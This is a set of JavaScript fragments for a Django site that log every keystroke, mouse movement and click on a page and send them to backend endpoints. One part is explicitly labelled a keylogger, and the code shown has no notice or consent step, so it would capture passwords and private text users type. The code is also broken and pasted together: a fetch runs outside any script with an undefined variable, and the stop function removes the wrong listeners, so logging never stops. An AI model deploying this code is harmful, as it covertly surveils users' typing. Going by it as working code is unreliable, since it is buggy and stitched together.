
<script type="text/javascript">
    const csrfToken = '{{ csrf_token }}';  // Django template tag to inject CSRF token
</script>

fetch('/api/log-mouse-action/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': csrfToken  // CSRF token in the header for POST requests
    },
    body: JSON.stringify(data)
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));


document.addEventListener('DOMContentLoaded', () => {
    const data = {
        keystrokes: [],
        mouseMoves: [],
        siteActions: []
    };

    // Track keystrokes
    document.addEventListener('keydown', (event) => {
        data.keystrokes.push({
            key: event.key,
            timestamp: new Date().toISOString()
        });
    });

    // Track mouse movements
    document.addEventListener('mousemove', (event) => {
        data.mouseMoves.push({
            x: event.clientX,
            y: event.clientY,
            timestamp: new Date().toISOString()
        });
    });

    // Track clicks and other actions
    document.addEventListener('click', (event) => {
        data.siteActions.push({
            type: 'click',
            element: event.target.tagName,
            timestamp: new Date().toISOString()
        });
    });

    // Send data to Django backend periodically
    setInterval(() => {
        if (data.keystrokes.length || data.mouseMoves.length || data.siteActions.length) {
            fetch('/log-actions/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': getCookie('csrftoken')
                },
                body: JSON.stringify(data)
            });

            // Reset data after sending
            data.keystrokes = [];
            data.mouseMoves = [];
            data.siteActions = [];
        }
    }, 5000); // Sends data every 5 seconds

    // Helper function to get CSRF token
    function getCookie(name) {
        let cookieValue = null;
        if (document.cookie && document.cookie !== '') {
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                const cookie = cookies[i].trim();
                if (cookie.startsWith(name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
});
let isKeyloggerActive = false;

function startKeylogger() {
    if (isKeyloggerActive) return; // Prevent multiple initializations
    isKeyloggerActive = true;

    // Start tracking keystrokes
    document.addEventListener('keydown', function (event) {
        let key = event.key;
        console.log('Key pressed: ' + key);

        // Send data to Django backend (API URL to log keystrokes)
        fetch('/api/log-keystroke/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ key: key })
        });
    });

    // Start tracking mouse movements
    document.addEventListener('mousemove', function (event) {
        let coordinates = { x: event.clientX, y: event.clientY };
        console.log('Mouse moved: ', coordinates);

        // Send mouse movement data to Django backend
        fetch('/api/log-mouse-action/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ action: 'move', coordinates: coordinates })
        });
    });

    console.log('Keylogger is active.');
}

function stopKeylogger() {
    if (!isKeyloggerActive) return;
    isKeyloggerActive = false;
    // Remove event listeners when keylogger is stopped
    document.removeEventListener('keydown', startKeylogger);
    document.removeEventListener('mousemove', startKeylogger);
    console.log('Keylogger is stopped.');
}
